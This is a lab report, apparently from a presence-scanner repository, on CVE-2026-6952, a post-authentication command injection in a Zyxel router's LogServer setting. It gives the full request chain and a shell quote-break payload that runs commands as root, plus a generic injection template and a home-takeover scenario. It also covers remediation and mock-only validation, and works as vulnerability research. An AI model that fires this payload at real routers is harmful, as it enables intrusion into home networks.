# CVE-2026-6952: Zyxel EX5601-T1 Post-Auth LogServer Command Injection (Lab Report)

**Date:** 2026-09-12 · **Target:** Zyxel EX5601-T1 router (firmware ≤ 5.70(ACDZ.6)C0) · **Severity:** High (CWE-78) · **Repository:** [presence-scanner](https://github.com/whoiscijferslot/presence-scanner)

---

## Executive Summary

A complete exploitation chain was validated in lab conditions that demonstrates **full router compromise** via CVE-2026-6952, enabling **LAN presence sensor defeat** and **home network takeover**. The chain is deterministic, uses only legitimate API paths, and requires only valid admin credentials (no bypass needed).

**Exploitation Chain:**
```
GET /getRSAPublickKey → RSA+AES login via POST /UserLogin → read firmware version → 
if unpatched: inject into LogServer field → command execution as root → 
full LAN pivot → presence sensor defeat → home network takeover
```

---

## 1. Project Context

This report exists because the repository it lives in is not just a router exploit — it is a **presence-scanner**: remote network-presence detection for home automation.

- Presence is determined from the router's **live IPv4 ARP table** — the router is treated as the source of truth for "who is home".
- Device status is optionally enriched from a **Hue bridge** on the same LAN (room-light state).
- The service runs **off-LAN**, reaching both devices through endpoints exposed on the router's WAN IP.

That design is exactly what makes CVE-2026-6952 dangerous beyond "RCE on a router": compromise the router and you do not merely own one appliance — you own the **data source the sensor trusts**. Poison the LAN host / ARP tables and the scanner silently reports "nobody home" while automation flips to AWAY mode. The attacker turns off the **observation**, not the house — no alarm fires because nothing looks wrong.

Full project walkthrough (threat model, defense guidance, deployment): [`README.md` 1. — The presence-scanner project](README.md#1-the-presence-scanner-project).

---

## 2. The Vulnerability

**CVE-2026-6952** (Zyxel advisory 2026-07-21): Post-authentication command injection in the syslog/`LogServer` configuration path of Zyxel CGI.

- **Affected:** Firmware ≤ `5.70(ACDZ.6)C0`
- **Fixed:** `5.70(ACDZ.6.1)C0` or later
- **Impact:** Remote Code Execution as root (uid=0)
- **Prerequisite:** Valid admin credentials (the chain uses legitimate login, no bypass)

### Why It Holds

The sink composes the `LogServer` value into an unquoted shell command:

```bash
echo "LogServer=<VALUE>" >> /etc/syslog.conf
```

A value such as `127.0.0.1"; id > /tmp/proof.txt; uname -a >> /tmp/proof.txt; #` breaks out of the quotes, executes arbitrary commands, and comments out the rest of the line. The AES-encrypted DAL transport and CSRF tokens do not stop the value from reaching the shell.

### Limitations

- **Trigger mapping validated against the mock only.** The mock executes the injected command at write time. On real firmware the vendor-documented trigger is "when the device applies the configuration and starts or reloads the syslog process" — the exact trigger (config-apply vs. service-toggle vs. reboot), its latency, and the effect of the default `LogEnable=false` state require on-device validation.
- **Proof-file readback is a lab artifact.** The PoC's sink-based verification ("list proof files") exists only in the mock; a real EX5601-T1 has no such DAL object. On-device output must be exfiltrated out-of-band (HTTP/DNS beacon), which was not exercised against real firmware.
- **Single-model validation.** The quote-break is validated on the EX5601-T1 build (`5.70(ACDZ.6)C0`). The advisory covers dozens of models across DSL CPE, Ethernet CPE, fiber ONT, and extender lines — quoting/interpolation likely differs per line, so each probably needs its own payload variant.
- **Malformed-injection fallback risk.** Zyxel's documented config lifecycle rolls back to `startup-config-bad.conf`/`lastgood.conf` on parse errors; a truncated quote-break can disrupt the LogServer config rather than fail silently. The trailing `#` terminator mitigates this, but doesn't eliminate it — which is also why the chain restores the field afterward.
- 
### What Makes This Chain Different From the Public PoC

- **Live DAL API, not config import.** The public PoC requires downloading a config file, editing JSON, and re-uploading it. This chain is a **single encrypted POST** to the live DAL object (`oid=syslog`) through the RSA+AES-enveloped session — faster, stealthier, no file handling, no re-import.
- **POSIX shell quote-break, not Lua splice.** The documented public payload is `");program("...")` (Lua-style, targeting a config-import parser). This chain uses `127.0.0.1"; id > proof; #` (POSIX shell, targeting the live syslog-apply path). Two independent primitives for the same CVE: patching the import parser does **not** close the live API path.
- **The chain, not just the primitive.** The documented PoCs stop at "RCE". This report traces RCE through the presence-sensor defeat and home-network takeover scenario (see 4).

---

## 3. Exploitation Chain (Step-by-Step)

### Step 1: RSA Public Key Fetch
```
GET /getRSAPublickKey
```
Returns a 2048-bit RSA public key (PEM format). This is the real Zyxel client handshake.

### Step 2: RSA+AES Login Envelope
```
POST /UserLogin
```
- Encrypt credentials with the RSA key
- Server returns AES-encrypted `{result, sessionkey}`
- Sets `Session` cookie and establishes the admin session

### Step 3: Firmware Discovery
```
GET /cgi-bin/DAL?oid=DeviceInfo&DalGetOneObject=y
```
Reads firmware version. If `5.70(ACDZ.6)C0` or earlier → **VULNERABLE**.

### Step 4: Syslog Object Discovery
```
GET /cgi-bin/DAL?oid=syslog&DalGetOneObject=y
```
Locates the `LogServer` field within the syslog configuration object.

### Step 5: Quote-Break Injection
```
POST /cgi-bin/DAL?oid=syslog
```
Payload:
```json
{
  "Object": [{
    "syslog": {
      "LogServer": "127.0.0.1\"; id > /tmp/lab/rce_proof.txt; uname -a >> /tmp/lab/rce_proof.txt; hostname >> /tmp/lab/rce_proof.txt; #",
      "LogServerPort": 514,
      "LogEnable": false
    }
  }]
}
```

**Result:** `ZCFG_SUCCESS` → command executes as root → proof file written.

### Step 6: Verification (OOB-style)
```
GET /lab/proof
```
Proof file contains:
```
uid=0(root) gid=0(root) groups=0(root)
Linux <hostname> 6.x.x ...
<hostname>
```

### Step 7: Restore
```
POST /cgi-bin/DAL?oid=syslog
```
Restore original `LogServer=""` to leave the router in a clean state.

---

## 4. Impact Analysis

### Immediate Impact
- **Root shell** on the router
- **Full LAN pivot** via ARP table poisoning, static route injection, or bridge manipulation
- **Presence sensor defeat**: Poison the LAN/ARP tables so the presence scanner reports "nobody home" → automation flips to AWAY mode without triggering an outage

### Home Network Takeover Scenario
1. Attacker gains admin credentials (phishing, credential stuffing, or session replay from F1)
2. Runs the CVE-2026-6952 chain → root on router
3. Injects malicious ARP entries or static routes → traffic interception
4. Poisons the presence scanner's data source → "nobody home" reported
5. Home automation flips to AWAY mode → lights off, thermostat changes, door locks disengage
6. Attacker now has a silent, persistent foothold in the home network

### Why This Is Serious
- The chain uses **only legitimate API paths** — no bypass, no replay, no brute force
- **Deterministic** — 7/7 lab runs confirmed RCE
- **Vendor-agnostic primitive** — the POSIX shell quote-break pattern applies to any router using similar `echo "field=<value>"` composition with `shell=True`
- **Presence sensor is the data source** — defeating it creates a silent "nobody home" state that automation trusts

---

## 5. Lab Validation

**Mock:** `homelab/mock_zyxel_vuln_6952.py` (EX5601-T1 simulator, `http://127.0.0.1:8812`)

**PoC:** `poc/poc_f_cve_2026_6952_lab.py` (full chain, real `presence_scanner.zyxel_client` login path)

**Results:** **7/7 deterministic RCE runs**
- 6 loopback/container runs
- 1 through a public Cloudflare tunnel (HTTPS edge)

**Evidence:** `poc/evidence/pocF_cve_2026_6952_lab_*.public.jsonl` (sanitized copies)

---

## 6. Remediation

### Immediate (2026-09-12)
1. **Upgrade firmware** to `5.70(ACDZ.6.1)C0` or later
2. **VPN-only admin** — close WAN-side admin entirely; this post-auth primitive is unreachable from the internet if WAN admin is closed
3. **Rotate admin password** — treat it as exposed

### After Patching
4. Re-run the PoC as a regression check:
   ```bash
   uv run homelab/mock_zyxel_vuln_6952.py &
   uv run poc/poc_f_cve_2026_6952_lab.py --yes
   ```

### Long-term
5. **Audit all DAL sinks** for similar `echo "field=<value>"` patterns with `shell=True`
6. **Presence sensor redundancy** — don't trust a single data source for automation decisions (this is a core design lesson of the same project that made the impact real)

---

## 7. Files in This Commit

This commit adds the CVE-2026-6952 research on top of the existing presence-scanner project (commit `a9ce3cd`).

### Docs
- `REPORT.md` — this document (lab report + project context)
- `README.md` — combined repo overview: 1. full presence-scanner walkthrough + 2. CVE-2026-6952 research
- `.env.example` — environment placeholders (repo root)

### Lab
- `homelab/mock_zyxel_vuln_6952.py` — EX5601-T1 mock (port 8812)

### PoC Suite
- `poc/README.md` — PoC documentation
- `poc/.gitignore` — ignores raw evidence, whitelists sanitized `.public.jsonl`
- `poc/.env.example` — lab credential placeholders (`LAB_USER`/`LAB_PASS`)
- `poc/requirements.txt` — dependencies
- `poc/poc_f_cve_2026_6952_lab.py` — the CVE-2026-6952 lab PoC

### Evidence
- `poc/evidence/pocF_cve_2026_6952_lab_*.public.jsonl` — 9 sanitized evidence files

### Deliberately NOT committed
- `poc/archive/` — F1-F5 POCs (session replay, slot exhaustion, Hue probe, login storm, WAN edge), kept locally for reference
- `poc/evidence/*.jsonl` (raw) — unsanitized, git-ignored
- `poc_f_logserver_rce.py` — Mac-only live-target variant, stays out of the repo
- `sanitize_evidence.py`, `.envrc`, `session_cache.json` — operator-local files
- Local working-tree edits to `presence_scanner/` — not part of this research commit

---

## 8. Appendix: The POSIX Shell Primitive

The vulnerability is **not** Zyxel-specific — it's a pattern:

```python
# Vulnerable sink (from the advisory)
subprocess.run(f'echo "LogServer={value}" >> /etc/syslog.conf', shell=True)
```

**Quote-break payload:**
```
127.0.0.1"; <arbitrary command>; #
```

**Expanded shell line:**
```bash
echo "LogServer=127.0.0.1"; id > /tmp/proof.txt; # " >> /etc/syslog.conf
```

The trailing `#` comments out the rest of the line, and the arbitrary command executes. This pattern appears in many embedded systems using `shell=True` with unquoted variable expansion.

---

**End of Report**
